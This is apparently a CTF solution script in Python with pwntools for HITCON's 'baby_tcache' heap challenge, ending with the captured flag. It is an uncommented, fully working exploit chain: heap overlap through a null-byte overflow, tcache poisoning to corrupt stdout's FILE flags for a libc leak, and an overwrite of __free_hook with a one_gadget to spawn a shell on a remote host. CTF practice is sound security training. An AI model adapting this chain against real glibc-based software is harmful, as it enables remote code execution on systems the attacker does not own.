from pwn import *
import sys, time

if len(sys.argv) == 1:
    p = process(["./baby_tcache"])

else:
    p = remote("52.68.236.186", "56746")

context.binary = "./baby_tcache"
libc = ELF("./libc.so.6")

def new(size, data, check=False):
    p.sendlineafter("choice: ", "1")
    p.sendlineafter("Size:", str(size))
    if not check:
        p.sendlineafter("Data:", data)
    if check:
        p.sendafter("Data:", data)

def delete(idx):
    p.sendlineafter("choice: ", "2")
    p.sendlineafter("Index:", str(idx))

new(0x4f0, "A" * 0x20)      # 0
new(0x48, "1" * 0x20)       # 1
new(0x58, "1" * 0x20)       # 2
new(0x68, "1" * 0x20)       # 3
new(0x4f8, "B" * 0x20)      # 4
new(0x1000, "1" * 0x20)     # 5
new(0x48, "1" * 0x20)       # 6
new(0x58, "1" * 0x20)       # 7
new(0x48, "1" * 0x20)       # 8
new(0x58, "1" * 0x20)       # 9

delete(3)
new(0x68, "A" * 0x60 + p64(0x70 * 3 + 0x500 - 0x30))       # 3
delete(0)
delete(4)

delete(6)
delete(7)
delete(8)
delete(9)
delete(1)
delete(2)
new(0x4f0, "a" * 0x20)  # 0
delete(0)

# 4-bit bruteforce
# 0x6760 -> last 2 byte
# 12~16 bit (4)

new(0x4f0 + 0x30, "a" * 0x4f0 + p64(0x0) + p64(0x71) + p16(0x6760), True)  # 0

'''
_flags = 0xfbad0000  // Magic number
_flags & = ~_IO_NO_WRITES // _flags = 0xfbad0000
_flags | = _IO_CURRENTLY_PUTTING // _flags = 0xfbad0800
_flags | = _IO_IS_APPENDING // _flags = 0xfbad1800
'''

new(0x48, "q" * 0x20)   # 1
new(0x48, p64(0xfbad3c80) + p64(0)*3 + "\x00", True) 

leak = p.recvuntil("$$")[:-2]
leak = u64(leak[8:16])
libc_base = leak - 0x3ed8b0
__malloc_hook = libc_base + libc.symbols["__malloc_hook"]
__free_hook = libc_base + libc.symbols["__free_hook"]
system = libc_base + libc.symbols["system"]
print hex(leak)
print hex(libc_base)
print hex(system)
print hex(__free_hook)
print hex(__malloc_hook)

'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c        execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
one = libc_base + 0x4f322


new(0x100, p64(0) * 3 + p64(0x71) + p64(__free_hook))
new(0x58, "/bin/sh\x00")
#new(0x58, p64(system))
new(0x58, p64(one))
new(0x88, "A" * 0x30)
new(0x88, "A" * 0x30)
delete(8)

p.interactive()

# hitcon{He4p_ch41leng3s_4r3_n3v3r_d34d_XD}
